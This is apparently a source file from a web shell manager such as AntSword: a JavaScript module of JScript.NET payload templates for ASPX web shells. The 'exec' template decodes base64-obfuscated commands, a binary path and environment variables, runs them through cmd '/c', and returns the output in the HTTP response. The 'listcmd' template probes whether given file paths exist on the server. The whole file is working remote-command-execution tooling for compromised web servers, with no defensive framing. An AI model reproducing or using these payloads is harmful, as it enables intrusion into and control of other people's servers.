/**
 * 命令执行模板
 */

module.exports = (arg1, arg2, arg3) => ({
  exec: {
    _: `var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String("#{newbase64::bin}".substr(#randomPrefix#))));
    var e=new System.Diagnostics.Process();
    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
    c.UseShellExecute=false;
    c.RedirectStandardOutput=true;
    c.RedirectStandardError=true;
    e.StartInfo=c;
    c.Arguments="/c "+System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String("#{newbase64::cmd}".substr(#randomPrefix#)));
    if("#{newbase64::env}".substr(#randomPrefix#)) {
      var envstr = System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String("#{newbase64::env}".substr(#randomPrefix#)));
      var envarr = envstr.split("|||asline|||");
      var i;
      for (var i in envarr) {
        var ss = envarr[i].split("|||askey|||");
        if (ss.length != 2) {
          continue;
        }
        c.EnvironmentVariables.Add(ss[0],ss[1]);
      }
    }
    e.Start();
    out=e.StandardOutput;
    EI=e.StandardError;
    e.Close();
    Response.Write(out.ReadToEnd() + EI.ReadToEnd());`.replace(/\n\s+/g, ''),
  },
  listcmd: {
    _: `var binarr=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String("#{newbase64::binarr}".substr(#randomPrefix#)));
      var ss=binarr.split(",");
      var i;
      for(var i in ss){
        Response.Write(ss[i]+"\\t"+(System.IO.File.Exists(ss[i])?1:0)+"\\n");
      }`.replace(/\n\s+/g, ''),
  }
})
